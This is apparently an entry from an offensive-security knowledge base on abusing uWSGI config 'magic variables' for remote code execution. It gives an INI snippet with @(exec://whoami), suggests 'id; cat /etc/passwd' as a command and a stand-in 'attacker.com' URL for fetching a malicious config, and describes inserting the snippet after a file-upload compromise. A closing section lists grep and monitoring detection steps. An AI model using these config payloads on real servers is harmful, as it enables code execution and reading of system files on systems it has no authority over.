---
id: b5c6e11c-bb56-4d61-a3d7-4b37b427cff9
name: uWSGI-Magic-Variables-Configuration-Example
type: code
language: ini
verified: true
created_at: '2023-04-06T03:56:40.941670+00:00'
updated_at: '2023-04-06T03:56:40.945323+00:00'
platforms:
  - Linux
tags:
  - uWSGI
  - magic-variables
  - RCE
  - configuration
validated: true
---

# uWSGI-Magic-Variables-Configuration-Example

## Code

```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; call a function returning a char *
characters = @(call://uwsgi_func)
```

## Description

This INI code snippet is an example uWSGI configuration section demonstrating magic variables for dynamic content resolution. It can be used to execute commands (e.g., @(exec://whoami) runs shell commands and captures output) or fetch external data, enabling RCE or exfiltration when injected into a live config. Preserve for reference in exploitation procedures; the [REDACTED] placeholders hide sensitive details like URLs or data blobs.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| [REDACTED] (data://) | Binary data appended to the uWSGI binary or file path | /path/to/appended/data.bin |
| [REDACTED] (http://) | URL to fetch config values from (potential SSRF vector) | http://attacker.com/malicious.ini |
| [REDACTED] (fd://) | File descriptor number for reading (e.g., from open files) | 3 |
| whoami (exec://) | Shell command to execute and capture stdout | id; cat /etc/passwd |
| uwsgi_func (call://) | uWSGI plugin function to invoke | custom_plugin_func |

## Usage

Insert this snippet into the [uwsgi] section of a uWSGI config file (e.g., uwsgi.ini). Restart the service to resolve variables: commands execute, HTTP fetches occur, etc. Ideal for post-compromise scenarios with config write access, such as via vulnerable file uploads in web apps.

## Detection

- Scan configs for @( patterns using grep: `grep -r '@(exec://\|http://' /etc/uwsgi/`.
- Monitor uWSGI logs for unexpected execve syscalls or outbound HTTP (e.g., via auditd or Suricata rules).
- Enable uWSGI's --strict config mode to fail on unresolved variables.
- File integrity monitoring (e.g., Tripwire) on config paths.

## Related

- [[Related Procedure: Exploit-uWSGI-Magic-Variables-for-Arbitrary-Execution]]
